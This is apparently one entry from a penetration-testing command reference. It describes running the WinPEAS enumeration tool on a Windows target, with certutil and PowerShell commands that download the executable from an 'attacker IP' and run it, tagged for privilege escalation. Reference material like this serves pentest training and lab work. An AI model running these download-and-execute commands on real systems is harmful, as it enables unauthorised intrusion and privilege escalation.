---
description: |
  Run WinPEAS to automatically enumerate privilege escalation vectors
  on a Windows target.

  Reference values:
    Attacker IP: 10.10.14.1
command: |
  # Download and run
  certutil -urlcache -f http://10.10.14.1/winPEASany.exe winpeas.exe
  .\winpeas.exe

  # PowerShell download
  IWR -Uri http://10.10.14.1/winPEASany.exe -OutFile winpeas.exe
  .\winpeas.exe
phase:
  - PrivEsc
target_os:
  - Windows
services: []
ports: []
items:
  - Shell
techniques:
  - Token_Impersonation
network_position:
  - Local
references:
  - https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
---
